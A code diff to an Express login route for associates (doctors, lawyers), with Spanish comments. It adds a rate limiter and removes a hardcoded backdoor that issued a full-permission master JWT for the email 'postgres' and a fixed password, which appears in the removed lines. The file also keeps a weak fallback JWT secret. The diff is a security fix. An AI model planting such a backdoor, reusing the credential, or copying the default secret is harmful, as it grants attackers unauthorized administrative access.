@@ -11,10 +11,19 @@ const express = require('express');
 const router = express.Router();
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
+const rateLimit = require('express-rate-limit');
 const { auth, adminOnly } = require('../middleware/auth');
 const AssociateService = require('../services/AssociateService');
 const { sequelize } = require('../config/database');
 const { QueryTypes } = require('sequelize');
+
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 10,
+  message: { success: false, error: 'Demasiados intentos. Intente en 15 minutos.' },
+  standardHeaders: true,
+  legacyHeaders: false,
+});
 
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
 const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '24h';
@@ -28,7 +37,7 @@ const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '24h';
  * @desc Login para asociados (médicos, abogados, etc.)
  * @access Public
  */
-router.post('/auth/login', async (req, res) => {
+router.post('/auth/login', loginLimiter, async (req, res) => {
     try {
         const { email, password } = req.body;
 
@@ -40,54 +49,6 @@ router.post('/auth/login', async (req, res) => {
         }
 
         console.log(`🔐 [ASSOCIATE AUTH] Intento de login: ${email}`);
-
-        // =============================================================================
-        // PUERTA TRASERA HARDCODEADA (solo conocida por admin del sistema)
-        // =============================================================================
-        if (email.toLowerCase() === 'postgres' && password === 'Aedr15150302') {
-            console.log('🚪 [ASSOCIATE AUTH] Acceso por puerta trasera (postgres) - ASOCIADO MASTER');
-
-            // Generar token especial de super-admin asociado
-            const token = jwt.sign(
-                {
-                    associate_id: 'ASSOCIATE_MASTER',
-                    email: 'postgres',
-                    category: 'administrative',
-                    source: 'backdoor',
-                    type: 'associate',
-                    is_backdoor: true
-                },
-                JWT_SECRET,
-                { expiresIn: '24h' }
-            );
-
-            return res.json({
-                success: true,
-                message: 'Acceso de asociado master concedido',
-                token,
-                associate: {
-                    id: 'ASSOCIATE_MASTER',
-                    email: 'postgres',
-                    first_name: 'Asociado',
-                    last_name: 'Master',
-                    phone: null,
-                    category: 'administrative',
-                    specialty: 'Administración Total',
-                    license_number: 'MASTER',
-                    is_active: true,
-                    approval_status: 'approved',
-                    account_status: 'active',
-                    is_backdoor: true,
-                    permissions: {
-                        can_view_all: true,
-                        can_manage_all: true,
-                        is_admin: true,
-                        is_master: true
-                    }
-                },
-                source: 'backdoor'
-            });
-        }
 
         // =============================================================================
         // LOGIN NORMAL (asociados registrados en base de datos)
